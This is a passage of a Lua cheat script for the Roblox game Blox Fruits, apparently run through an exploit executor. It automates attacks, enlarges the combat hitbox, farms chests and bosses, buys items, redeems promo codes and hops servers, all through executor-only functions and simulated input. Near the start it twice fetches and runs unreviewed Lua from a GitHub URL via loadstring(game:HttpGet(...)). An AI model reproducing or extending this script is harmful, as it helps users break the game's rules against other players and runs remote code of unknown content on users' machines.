    gg5iihetiter9pihtr = loadstring(game:HttpGet("https://raw.githubusercontent.com/memaybeohub/Function-Scripts/main/fastattackez.lua"))()
    spawn(function() while task.wait() do  CountAttack = gg5iihetiter9pihtr:GetCount() task.wait() end end)
    function ReturnFunctions:GetCount()
        return CountAttack
    end
    function ReturnFunctions:Attack(k)
        UFFF = k
    end
    FastAttackSettings = {
        ["CDAAT"] = 80,
        ["TimeWait"] = 10
    }
    spawn(
        function()
            local CameraShakerR = require(game.ReplicatedStorage.Util.CameraShaker)
            CameraShakerR:Stop()
        end
    )
    function ReturnFunctions:InputValue(CDAAT, TimeWait)
        FastAttackSettings["CDAAT"] = CDAAT
        FastAttackSettings["TimeWait"] = TimeWait
    end
    function Click()
        local VirtualUser = game:GetService("VirtualUser")
        VirtualUser:CaptureController()
        VirtualUser:ClickButton1(Vector2.new(851, 158), game:GetService("Workspace").Camera.CFrame)
    end
    ToiCanOxi = 0
    spawn(
        function()
            while task.wait() do
                if UFFF then
                    pcall(
                        function()
                            if CountAttack < FastAttackSettings["CDAAT"] then
                                ToiCanOxi = ToiCanOxi + 1
                                AttackFunctgggggion()
                                if Settings and Settings["Mastery Farm"] and Settings["DelayAttack"] then
                                    wait(Settings["DelayAttack"])
                                end
                            else
                                ToiCanOxi = ToiCanOxi + 1
                                AttackFunctgggggion()
                                if Settings and Settings["DelayAttack"] then 
                                    wait(Settings["DelayAttack"] * 2)
                                end
                            end
                        end
                    )
                end
            end
        end
    )
    memaydonand = 0
    spawn(
        function()
            while task.wait() do
                if UFFF then
                    pcall(
                        function()
                            if memaydonand % 2 == 1 then
                                wait(1)
                            end
                            local Fastflux =
                                getupvalues(
                                require(game:GetService("Players").LocalPlayer.PlayerScripts.CombatFramework)
                            )[2]
                            Fastflux.activeController.hitboxMagnitude = 55
                            local VirtualUser = game:GetService("VirtualUser")
                            VirtualUser:CaptureController()
                            VirtualUser:ClickButton1(Vector2.new(851, 158), game:GetService("Workspace").Camera.CFrame)
                            memaydonand = memaydonand + 1
                        end
                    )
                end
            end
        end
    )
    spawn(
        function()
            while wait() do
                if UFFF then
                    if CountAttack >= FastAttackSettings["CDAAT"] then
                        TickFastAttackF = tick()
                        repeat
                            wait()
                        until tick() - TickFastAttackF >= FastAttackSettings["TimeWait"]
                        CountAttack = 0
                    end
                end
            end
        end
    )
    return ReturnFunctions
end
FastAttackConnector = loadstring(game:HttpGet("https://raw.githubusercontent.com/memaybeohub/Function-Scripts/main/test2.lua"))()
function AttackFunction()
    FastAttackConnector:Attack()
end
function Click()
    local VirtualUser = game:GetService("VirtualUser")
    VirtualUser:CaptureController()
    VirtualUser:ClickButton1(Vector2.new(851, 158), game:GetService("Workspace").Camera.CFrame)
end
spawn(
    function()
        while wait() do
            if UseFastAttack or Settings["Attack No CD Aura"] then
                FastAttackConnector:InputSetting(Settings)
                FastAttackConnector:InputValue(Settings["CDAAT"], Settings["TimeWait"])
                FastAttackConnector:Attack(true)
            else
                FastAttackConnector:Attack(false)
            end
        end
    end
)
game:GetService("ReplicatedStorage").Assets.GUI.DamageCounter.Enabled = true
task.spawn(
    function()
        while task.wait() do
            task.wait()
            if AutoActiveRace then
                if
                    game.Players.LocalPlayer.Character:FindFirstChild("RaceEnergy") and
                        game.Players.LocalPlayer.Character.RaceEnergy.Value >= 1 and
                        not game.Players.LocalPlayer.Character.RaceTransformed.Value
                 then
                    local vim = game:service("VirtualInputManager")
                    vim:SendKeyEvent(true, "Y", false, game)
                    task.wait()
                    vim:SendKeyEvent(false, "Y", false, game)
                end
            end
        end
    end
)
task.spawn(
    function()
        while task.wait() do
            task.wait()
            if WaitUntilMeterOut then
                wait()
                if
                    game.Players.LocalPlayer.Character:FindFirstChild("RaceTransformed") and
                        game.Players.LocalPlayer.Character.RaceTransformed.Value
                 then
                    CancelTween()
                    task.wait(1.5)
                    AntiLowHealth(math.random(100, 10000))
                end
            end
        end
    end
)
task.spawn(
    function()
        while task.wait() do
            task.wait()
            if AutoResetCharacterRace then
                if
                    game.Players.LocalPlayer.Character:FindFirstChild("RaceTransformed") and
                        game.Players.LocalPlayer.Character.RaceTransformed.Value
                 then
                    if game.Players.LocalPlayer.Character.RaceTransformed.Value then
                        task.wait()
                        pcall(
                            function()
                                game.Players.LocalPlayer.Character.Humanoid.Health = 0
                            end
                        )
                        task.wait(5)
                    end
                end
            end
        end
    end
)
function ClaimQuestV3()
    local v113 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "1")
    if v113 == 0 then
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "2")
        wait(.1)
        Notify(nil, "Claimed Quest V3", 10)
    elseif v113 == -1 then
        Notify(nil, "Leak of 2mill neli")
    end
end
function ReturnBosses(bossname)
    if game:GetService("ReplicatedStorage"):FindFirstChild(bossname) then
        for i, v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
            if v.Name == bossname and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                return v
            end
        end
    end
    if game.workspace.Enemies:FindFirstChild(bossname) then
        for i, v in pairs(game.workspace.Enemies:GetChildren()) do
            if v.Name == bossname and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                return v
            end
        end
    end
    return false
end
function CheckBoss(bossname)
    if game:GetService("ReplicatedStorage"):FindFirstChild(bossname) then
        for i, v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
            if v.Name == bossname and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                return v
            end
        end
    end
    if game.workspace.Enemies:FindFirstChild(bossname) then
        for i, v in pairs(game.workspace.Enemies:GetChildren()) do
            if v.Name == bossname and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                return v
            end
        end
    end
end
function EnableBuso()
    if not game.Players.LocalPlayer.Character:FindFirstChild("HasBuso") then
        NoClip = true
        local args = {
            [1] = "Buso"
        }
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
        NoClip = false
    end
    NoClip = false
end
function GetWeapon(wptype)
    s = ""
    for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        if v:IsA("Tool") and v.ToolTip == wptype then
            s = v.Name
        end
    end
    for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
        if v:IsA("Tool") and v.ToolTip == wptype then
            s = v.Name
        end
    end
    return s
end
function EquipWeapon(ToolSe)
    if gggggg then return end 
    if lonmemayto == "" or lonmemayto == nil then
        lonmemayto = "Melee"
    end
    ToolSe = GetWeapon(lonmemayto)
    if game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe) then
        NoClip = true
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe)
        wait(.4)
        game.Players.LocalPlayer.Character.Humanoid:EquipTool(tool)
        NoClip = false
    end
end
function TweenMirage()
    repeat
        wait()
    until game:GetService("Workspace").Map:FindFirstChild("MysticIsland")
    ----print("Tweening to Mirage Island")
    if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
        AllNPCS = getnilinstances()
        for i, v in pairs(game:GetService("Workspace").NPCs:GetChildren()) do
            table.insert(AllNPCS, v)
        end
        for i, v in pairs(AllNPCS) do
            if v.Name == "Advanced Fruit Dealer" then
                Tweento(v.HumanoidRootPart.CFrame)
            end
        end
    end
end
function UpV3NoTween()
    Arowe =
        CFrame.new(
        -1988.55322,
        124.841248,
        -70.4718018,
        0.173624337,
        0,
        0.984811902,
        0,
        1,
        0,
        -0.984811902,
        0,
        0.173624337
    ) * CFrame.new(0, 3, 0)
    local args = {
        [1] = "Wenlocktoad",
        [2] = "3"
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
end
function UpV3()
    Arowe =
        CFrame.new(
        -1988.55322,
        124.841248,
        -70.4718018,
        0.173624337,
        0,
        0.984811902,
        0,
        1,
        0,
        -0.984811902,
        0,
        0.173624337
    ) * CFrame.new(0, 3, 0)
    Tweento(Arowe)
    local args = {
        [1] = "Wenlocktoad",
        [2] = "3"
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
end
function TweenTemple()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
        "requestEntrance",
        Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586)
    )
end
function TweenTempleLegit()
    TweenTemple()
    AllNPCS = getnilinstances()
    for i, v in pairs(game:GetService("Workspace").NPCs:GetChildren()) do
        table.insert(AllNPCS, v)
    end
    for i, v in pairs(AllNPCS) do
        if v.Name == "Mysterious Force" then
            TempleMysteriousNPC1 = v
        end
        if v.Name == "Mysterious Force3" then
            TempleMysteriousNPC2 = v
        end
    end
    Tweento(TempleMysteriousNPC2.HumanoidRootPart.CFrame)
    wait(0.5)
    if (TempleMysteriousNPC2.HumanoidRootPart.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 15 then 
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress", "TeleportBack")
    end
    if (TempleMysteriousNPC1.HumanoidRootPart.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 15 then 
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress", "Teleport")
    end
end
function CheckAndTweenTemple()
    if (TempleOfTimeCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1200 then
        TweenTemple()
    end
    if (TempleOfTimeCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1200 then
        TweenTemple()
    end
end
function NoFog()
    local c = game.Lighting
    c.FogEnd = 100000
    for i, v in pairs(c:GetDescendants()) do
        if v:IsA("Atmosphere") then
            v:Destroy()
        end
    end
end

function CheckMoon()
    moon8 = "http://www.roblox.com/asset/?id=9709150401"
    moon7 = "http://www.roblox.com/asset/?id=9709150086"
    moon6 = "http://www.roblox.com/asset/?id=9709149680"
    moon5 = "http://www.roblox.com/asset/?id=9709149431"
    moon4 = "http://www.roblox.com/asset/?id=9709149052"
    moon3 = "http://www.roblox.com/asset/?id=9709143733"
    moon2 = "http://www.roblox.com/asset/?id=9709139597"
    moon1 = "http://www.roblox.com/asset/?id=9709135895"
    moonreal = MoonTextureId()
    cofullmoonkothangbeo = "Bad Moon"
    if moonreal == moon5 or moonreal == moon4 then
        if moonreal == moon5 then
            cofullmoonkothangbeo = "Full Moon"
        elseif moonreal == moon4 then
            cofullmoonkothangbeo = "Next Night"
        end
    end
    return cofullmoonkothangbeo
end
function getBlueGear()
    if game.workspace.Map:FindFirstChild("MysticIsland") then
        for i, v in pairs(game.workspace.Map.MysticIsland:GetChildren()) do
            if v:IsA("MeshPart") and v.MeshId == "rbxassetid://10153114969" then --and not v.CanCollide then
                return v
            end
        end
    end
end
function getHighestPoint()
    if not game.workspace.Map:FindFirstChild("MysticIsland") then
        return nil
    end
    for i, v in pairs(game:GetService("Workspace").Map.MysticIsland:GetDescendants()) do
        if v:IsA("MeshPart") then
            if v.MeshId == "rbxassetid://6745037796" then
                return v
            end
        end
    end
end
function TwenetoHighestPoint()
    HighestPoint = getHighestPoint()
    if HighestPoint then
        Tweento(HighestPoint.CFrame * CFrame.new(0, 211.88, 0))
    end
end
function MoveCamtoMoon()
    workspace.CurrentCamera.CFrame =
        CFrame.new(
        workspace.CurrentCamera.CFrame.Position,
        game:GetService("Lighting"):GetMoonDirection() + workspace.CurrentCamera.CFrame.Position
    )
end
spawn(function()
    while task.wait() do 
        ChestTable = {}
        for i, v in pairs(game.Workspace:GetDescendants()) do
            pcall(function()
                if string.find(v.Name, "Chest") then
                    table.insert(ChestTable, v.CFrame)
                end
            end)
        end
        task.wait(1)
    end
end)
function GetNearestChest()
    ClosetDistance = math.huge
    for i, v in pairs(ChestTable) do
        if (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < ClosetDistance then
            ClosetDistance = (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
        end
    end
    for i, v in pairs(ChestTable) do
        if (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= ClosetDistance then
            return v
        end
    end
end
function CheckMaterialCount(mt)
    for k, v in pairs(game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("getInventory")) do
        if v["Name"] == mt then
            return v["Count"]
        end
    end
    return 0
end
EctoplasmMobs = {
    "Ship Deckhand [Lv. 1250]",
    "Ship Engineer [Lv. 1275]",
    "Ship Steward [Lv. 1300]"
}
EctoplasmMobsSpawn = {}
for i, v in pairs(EctoplasmMobs) do
    table.insert(EctoplasmMobsSpawn, tostring(v:gsub(" %pLv. %d+%p", "")))
end
function CheckMob(tbmob, wijwerg)
    for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
        if
            table.find(tbmob, v.Name) and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
                v.Humanoid.Health > 0
         then
            return v
        end
    end
    if wijwerg then
        ----print("check k")
        for i, v in pairs(game.ReplicatedStorage:GetChildren()) do
            if
                table.find(tbmob, v.Name) and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
                    v.Humanoid.Health > 0
             then
                return v
            end
        end
    end
end
function CheckMobInReplicatedStorage(tbmob)
    for i, v in pairs(game.ReplicatedStorage:GetChildren()) do
        if table.find(tbmob, v.Name) then
            return true
        end
    end
    return false
end
function CheckMobInEmenySpawns(tbmob)
    for i, v in pairs(game:GetService("Workspace")["_WorldOrigin"].EnemySpawns:GetChildren()) do
        if table.find(tbmob, v.Name) then
            return true
        end
    end
    return false
end
function TweentoBlueGear()
    BlueGear = getBlueGear()
    if BlueGear then
        Tweento(BlueGear.CFrame)
    end
end
function function7()
    GameTime = "Error"
    local c = game.Lighting
    local c2 = c.ClockTime
    if c2 >= 16 or c2 < 5 then
        GameTime = "Night"
    else
        GameTime = "Day"
    end
    return GameTime
end
function StopTween()
    pcall(
        function()
            tween:Cancel()
        end
    )
end
MainTab:AddSection({Name = "Visual"})
MainTab:AddToggle({
    Name = "Auto Beta",
    Default = Settings["CuttayV4"],
    Callback = function(v)
        SaveSettings("CuttayV4",v)
    end
})
MainTab:AddButton(
    {
        Name = "Remove Fog",
        Callback = function()
            NoFog()
        end
    }
)
MainTab:AddButton(
    {
        Name = "Check Moon Status",
        Callback = function()
            Notify("Moon Status", CheckMoon(), 10)
        end
    }
)
if Sea3 then
    MainTab:AddSection({Name = "Mirage Puzzle"})
    MainTab:AddButton(
        {
            Name = "Tween to Blue Gear",
            Callback = function()
                TweentoBlueGear()
            end
        }
    )
    MainTab:AddButton(
        {
            Name = "Tween to Highest Point",
            Callback = function()
                TwenetoHighestPoint()
            end
        }
    )
    MoveCamTooMoonToggle =
        MainTab:AddToggle(
        {
            Name = "Auto Move Cam to Moon",
            Default = Settings["MoveCamToMoon"],
            Save = false,
            Flag = "Aura",
            Callback = function(Value)
                SaveSettings("MoveCamToMoon", Value)
            end
        }
    )
    AutoPullLever =
        MainTab:AddToggle(
        {
            Name = "Auto Pull Lever",
            Default = Settings["AutoPullLever"],
            --Settings["AutoPullLever"],
            Save = false,
            Flag = "Aura",
            Callback = function(Value)
                SaveSettings("AutoPullLever", Value)
            end
        }
    )
    spawn(
        function()
            while task.wait() do
                if Settings["MoveCamToMoon"] then
                    MoveCamtoMoon()
                end
            end
        end
    )
    Memayto = false
    DaGatCan = false
    if game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CheckTempleDoor") then 
        DaGatCan = true 
    end
    function PullLever()
        local mmbtruoc =
            CFrame.new(
            28576.4688,
            14939.2832,
            76.5164413,
            -1,
            0,
            0,
            0,
            0.707134247,
            -0.707079291,
            -0,
            -0.707079291,
            -0.707134247
        )
        local mmbsau =
            CFrame.new(
            28576.4688,
            14935.9512,
            75.469101,
            -1,
            -4.22219593e-08,
            1.13133396e-08,
            0,
            -0.258819044,
            -0.965925813,
            4.37113883e-08,
            -0.965925813,
            0.258819044
        )
        local mmb2 = 0.2
        if
            game:GetService("Workspace").Map["Temple of Time"].Lever.Lever.CFrame.Z > mmbsau.Z + mmb2 or
                game:GetService("Workspace").Map["Temple of Time"].Lever.Lever.CFrame.Z < mmbsau.Z - mmb2
         then
            CheckAndTweenTemple()
            Tweento(game:GetService("Workspace").Map["Temple of Time"].Lever.Part.CFrame)
            for i, v in pairs(game:GetService("Workspace").Map["Temple of Time"].Lever:GetDescendants()) do
                if v.Name == "ProximityPrompt" then
                    fireproximityprompt(v)
                end
            end
        end
    end
    MainTab:AddButton(
        {
            Name = "Tween to Mirage Island",
            Callback = function()
                TweenMirage()
            end
        }
    )
    MainTab:AddButton(
        {
            Name = "Tween to Temple Of Time",
            Callback = function()
                TweenTempleLegit()
            end
        }
    )
end
MainTab:AddSection({Name = "Local Player & Server"})
function RedeemAllCodesX2()
    CodesX2 = {
        "Sub2CaptainMaui",
        "CODE_SERVICIO",
        "CINCODEMAYO_BOOST",
        "15B_BESTBROTHERS",
        "DEVSCOOKING",
        "GAMERROBOT_YT",
        "ADMINGIVEAWAY",
        "GAMER_ROBOT_1M",
        "TY_FOR_WATCHING",
        "kittgaming",
        "Sub2Fer999",
        "Enyu_is_Pro",
        "Magicbus",
        "JCWK",
        "Starcodeheo",
        "Bluxxy",
        "fudd10_v2",
        "FUDD10",
        "BIGNEWS",
        "THEGREATACE",
        "SUB2GAMERROBOT_EXP1",
        "Sub2OfficialNoobie",
        "StrawHatMaine",
        "SUB2NOOBMASTER123",
        "Sub2Daigrock",
        "Axiore",
        "TantaiGaming"
    }
    for i,v in pairs(CodesX2) do 
        game:GetService("ReplicatedStorage").Remotes.Redeem:InvokeServer(v)
    end
end
MainTab:AddToggle({
    Name = "Auto Chest",
    Default = Settings["Auto Chest"],
    Callback = function(BaKhiaSkidToiDauR)
        SaveSettings("Auto Chest",BaKhiaSkidToiDauR)
    end
})
MainTab:AddToggle({
    Name = "Hop After 15 Chest",
    Default = Settings["Hop After 15 Chest"],
    Callback = function(BaKhiaSkidToiDauR)
        SaveSettings("Hop After 15 Chest",BaKhiaSkidToiDauR)
    end
})
MainTab:AddButton({
    Name = "Redeem All Codes",
    Callback = function()
        RedeemAllCodesX2()
    end
})
tablestats = {
    "Melee",
    "Defense",
    "Sword",
    "Gun",
    "Demon Fruit"
}
tablestatssave = {}
if Settings["Auto Stats Choosen"] then
    tablestatssave = Settings["Auto Stats Choosen"]
end

MainTab:AddDropdown(
    {
        Name = "Select a stats to add",
        Default = "",
        Options = tablestats,
        Callback = function(loser)
            tablestatssave[loser] = not tablestatssave[loser]
            Notify("Script Notifcations", tostring(loser) .. " = " .. tostring(tablestatssave[loser]))
            SaveSettings("Auto Stats Choosen", tablestatssave)
        end
    }
)
function NameMelee()
    for i, v in next, game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
        if v:IsA("Tool") and v.ToolTip == "Melee" then
            return v.Name
        end
    end
    for i, v in next, game:GetService("Players").LocalPlayer.Character:GetChildren() do
        if v:IsA("Tool") and v.ToolTip == "Melee" then
            return v.Name
        end
    end
end
function NameSword()
    for i, v in next, game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
        if v:IsA("Tool") and v.ToolTip == "Sword" then
            return v.Name
        end
    end
    for i, v in next, game:GetService("Players").LocalPlayer.Character:GetChildren() do
        if v:IsA("Tool") and v.ToolTip == "Sword" then
            return v.Name
        end
    end
end
pricemelee = {
    ["Black Leg"] = {Beli = 150000,Fragment = 0},
    ["Fishman Karate"] = {Beli = 750000,Fragment = 0},
    ["Electro"] = {Beli = 500000,Fragment = 0},
    ["Dragon Claw"] = {Beli = 0,Fragment = 1500},
    ["Superhuman"] = {Beli = 3000000,Fragment = 0},
    ["Sharkman Karate"] = {Beli = 2500000 ,Fragment = 5000},
    ["Death Step"] = {Beli = 2500000 ,Fragment = 5000},
    ["Dragon Talon"] = {Beli = 3000000 ,Fragment = 5000},
    ["Godhuman"] = {Beli = 5000000 ,Fragment = 5000},
    ["Electric Claw"] = {Beli = 3000000 ,Fragment = 5000},
}
pricemelee = {
    ["Black Leg"] = {Beli = 150000,Fragment = 0},
    ["Fishman Karate"] = {Beli = 750000,Fragment = 0},
    ["Electro"] = {Beli = 500000,Fragment = 0},
    ["Dragon Claw"] = {Beli = 0,Fragment = 1500},
    ["Superhuman"] = {Beli = 3000000,Fragment = 0},
    ["Sharkman Karate"] = {Beli = 2500000 ,Fragment = 5000},
    ["Death Step"] = {Beli = 2500000 ,Fragment = 5000},
    ["Dragon Talon"] = {Beli = 3000000 ,Fragment = 5000},
    ["Godhuman"] = {Beli = 5000000 ,Fragment = 5000},
    ["Electric Claw"] = {Beli = 3000000 ,Fragment = 5000},
}
buymeleetable = {
    ["Black Leg"] = "BuyBlackLeg",
    ["Fishman Karate"] = "BuyFishmanKarate",
    ["Electro"] = "BuyElectro",
    ["Dragon Claw"] = function()
        dragonclawtrue = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "1") == 1
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "2")
        return dragonclawtrue
    end,
    ["Superhuman"] = "BuySuperhuman",
    ["Sharkman Karate"] = "BuySharkmanKarate",
    ["Death Step"] = "BuyDeathStep",
    ["Dragon Talon"] = "BuyDragonTalon",
    ["Godhuman"] = "BuyGodhuman",
    ["Electric Claw"] = "BuyElectricClaw",
}
browhat = {
    ["Black Leg"] = "BuyBlackLeg",
    ["Fishman Karate"] = "BuyFishmanKarate",
    ["Electro"] = "BuyElectro",
    ["Dragon Claw"] = function()
        dragonclawtrue = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "1") == 1
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "2")
        return dragonclawtrue
    end,
    ["Superhuman"] = "BuySuperhuman",
    ["Sharkman Karate"] = "BuySharkmanKarate",
    ["Death Step"] = "BuyDeathStep",
    ["Dragon Talon"] = "BuyDragonTalon",
    ["Godhuman"] = "BuyGodhuman",
    ["Electric Claw"] = "BuyElectricClaw",
}
function BuyMelee(vcc,oh)
    browhat = {
        ["Black Leg"] = "BuyBlackLeg",
        ["Fishman Karate"] = "BuyFishmanKarate",
        ["Electro"] = "BuyElectro",
        ["Dragon Claw"] = function()
            dragonclawtrue = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "1") == 1
            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "2")
            return dragonclawtrue
        end,
        ["Superhuman"] = "BuySuperhuman",
        ["Sharkman Karate"] = "BuySharkmanKarate",
        ["Death Step"] = "BuyDeathStep",
        ["Dragon Talon"] = "BuyDragonTalon",
        ["Godhuman"] = "BuyGodhuman",
        ["Electric Claw"] = "BuyElectricClaw",
    }
    momo = browhat[vcc]
    if type(momo) == "string" then
        print(tostring(momo).." string")
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer(momo,true)
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer(momo)
    else
        momo = momo()
    end
    if oh then 
        v = vcc
        if pricemelee[v] and pricemelee[v].Beli and pricemelee[v].Beli <= LocalPlayerBeliValue and pricemelee[v].Fragment and pricemelee[v].Fragment <= LocalPlayerFragmentValue then 
            momo = browhat[v]
            if type(momo) == "string" then
                game.ReplicatedStorage.Remotes.CommF_:InvokeServer(momo,true)
                game.ReplicatedStorage.Remotes.CommF_:InvokeServer(momo)
            elseif type(momo) == "function" then 
                momo()
            end
        end
    end
end
function CheckPriceAndBuyMelee(hg)
    if SaveMasteryMelee()[hg] > 0 then 
        return BuyMelee(hg)
    end
    v = hg 
    if pricemelee[v] and pricemelee[v].Beli and pricemelee[v].Beli <= LocalPlayerBeliValue and pricemelee[v].Fragment and pricemelee[v].Fragment <= LocalPlayerFragmentValue then 
        BuyMelee(v)
    end
end
function GetAndCheckMeleeMastery(meleename,oh)
    mm = meleename
    usingmelee = browhat[NameMelee()]
    momo = browhat[mm]
    if type(momo) == "string" then
        momo = game.ReplicatedStorage.Remotes.CommF_:InvokeServer(momo,true) == 1 
    else
        momo = momo()
    end
    if momo then 
        if not game.Players.LocalPlayer.Character:FindFirstChild(mm) and not game.Players.LocalPlayer.Backpack:FindFirstChild(mm) then
            momo = browhat[mm]
            if type(momo) == "string" then
                game.ReplicatedStorage.Remotes.CommF_:InvokeServer(momo,true)
                momo = game.ReplicatedStorage.Remotes.CommF_:InvokeServer(momo)
            else
                momo = momo()
            end
        end
        if game.Players.LocalPlayer.Character:FindFirstChild(mm) or game.Players.LocalPlayer.Backpack:FindFirstChild(mm) then
            kwekrwe = {
                game.Players.LocalPlayer.Character,
                game.Players.LocalPlayer.Backpack
            }
            for i, v in pairs(kwekrwe) do
                if v:FindFirstChild(mm) then
                    return v[mm].Level.Value
                end
            end
        end
    end
    return 0
end
function SaveMasteryMelee()
    Melee_Mastery = Settings["Melee_Mastery"] or {
        ["Black Leg"] = "BuyBlackLeg",
        ["Fishman Karate"] = "BuyFishmanKarate",
        ["Electro"] = "BuyElectro",
        ["Dragon Claw"] = function()
            dragonclawtrue = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "1") == 1
            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "2")
            return dragonclawtrue
        end,
        ["Superhuman"] = "BuySuperhuman",
        ["Sharkman Karate"] = "BuySharkmanKarate",
        ["Death Step"] = "BuyDeathStep",
        ["Dragon Talon"] = "BuyDragonTalon",
        ["Godhuman"] = "BuyGodhuman",
        ["Electric Claw"] = "BuyElectricClaw",
    }
    for i,v in pairs(Melee_Mastery) do 
        if (type(v) == "number" and v<400) or type(v) ~= "number" then
            Melee_Mastery[i] = GetAndCheckMeleeMastery(i)
        end
    end 
    SaveSettings("Melee_Mastery",Melee_Mastery)
    return Settings["Melee_Mastery"]
end
tablemm = {"Black Leg","Electro","Fishman Karate","Dragon Claw"}
function DetectMeleeSPHM()
    vanmeo = SaveMasteryMelee()
    for i,v in pairs(tablemm) do 
        if vanmeo[v] < 300 then 
            return v
        end
    end
end
function CheckPhouyeDoor()
    if game.Workspace.Map.IceCastle.Hall.LibraryDoor:FindFirstChild("PhoeyuDoor") then 
        return game.Workspace.Map.IceCastle.Hall.LibraryDoor.PhoeyuDoor.CanCollide
    end
end
WaterKey = false
function CheckWaterKey()
    if WaterKey then return WaterKey end 
    local v178 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuySharkmanKarate", true)
    if v178 == 3 or v178 == 1 then WaterKey = true; return true end
    local v180 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuySharkmanKarate")
    if v180 == 1 or v180 == 0 or v180 == 2 then WaterKey = true; return true end 
end
function CheckBackPack(sd)
    BackpackandCharacter = {
        game.Players.LocalPlayer.Backpack,
        game.Players.LocalPlayer.Character
    }
    for _,folder in pairs(BackpackandCharacter) do 
        for i,v in pairs(folder:GetChildren()) do 
            if v.Name == sd then 
                return v 
            end
        end
    end
end
spawn(function()
    while task.wait() do 
        if Settings["Auto Melee"] then 
            MyMelee = NameMelee()
            willspark = SaveMasteryMelee()
            if Settings["Auto Melee"] then 
                if Settings["Melee Choosen"]["Superhuman"] and willspark["Superhuman"] == 0 then 
                    if willspark["Black Leg"] == 0 then 
                        if LocalPlayerBeliValue >= 150000 then 
                            BuyMelee("Black Leg",true)
                        end
                    elseif willspark["Black Leg"] > 0 and willspark["Black Leg"] < 300 then 
                        BuyMelee("Black Leg",true)
                    elseif willspark["Fishman Karate"] > 0 and willspark["Fishman Karate"] < 300 then 
                        BuyMelee("Fishman Karate",true)
                    elseif willspark["Electro"] > 0 and willspark["Electro"] < 300 then 
                        BuyMelee("Electro",true)
                    elseif willspark["Dragon Claw"] > 0 and willspark["Dragon Claw"] < 300 then 
                        BuyMelee("Dragon Claw",true)
                    elseif willspark["Fishman Karate"] == 0 then 
                        if LocalPlayerBeliValue >= 750000 then 
                            BuyMelee("Fishman Karate",true)
                        end
                    elseif willspark["Electro"] == 0 then 
                        if LocalPlayerBeliValue >= 500000 then 
                            BuyMelee("Electro",true)
                        end
                    elseif willspark["Dragon Claw"] == 0 then 
                        if LocalPlayerFragmentValue >= 1500 then 
                            BuyMelee("Dragon Claw",true)
                        else
                            if Sea2 or Sea3 then 
                                Settings["Auto Raid"] = true 
                            end
                        end
                    elseif LocalPlayerBeliValue >= 3000000 then 
                        BuyMelee("Superhuman",true)
                    end
                elseif Settings["Melee Choosen"]["Death Step"] and willspark["Death Step"] == 0 then
                    TeleportSea(2)
                    if willspark["Black Leg"] == 0 then
                        CheckPriceAndBuyMelee("Black Leg")
                    elseif willspark["Black Leg"] > 0 and willspark["Black Leg"] < 400 then 
                        BuyMelee("Black Leg",true)
                        if CheckPhouyeDoor() then 
                            if ReturnBosses("Awakened Ice Admiral [Lv. 1400] [Boss]") then 
                                FarmBoss_Toggle:Set(true)
                                SelectBoss_Dropdown:Refresh(GetBossTable())
                                SelectBoss_Dropdown:Set("Awakened Ice Admiral [Lv. 1400] [Boss]")
                            else
                                FarmBoss_Toggle:Set(false)
                            end
                        end
                    elseif willspark["Black Leg"] >= 400 then 
                        if CheckPhouyeDoor() then 
                            if ReturnBosses("Awakened Ice Admiral [Lv. 1400] [Boss]") then 
                                FarmBoss_Toggle:Set(true)
                                SelectBoss_Dropdown:Refresh(GetBossTable())
                                SelectBoss_Dropdown:Set("Awakened Ice Admiral [Lv. 1400] [Boss]")
                            else
                                FarmBoss_Toggle:Set(false)
                                if Settings["HopOption"] then 
                                    HopServer()
                                end
                            end
                        else
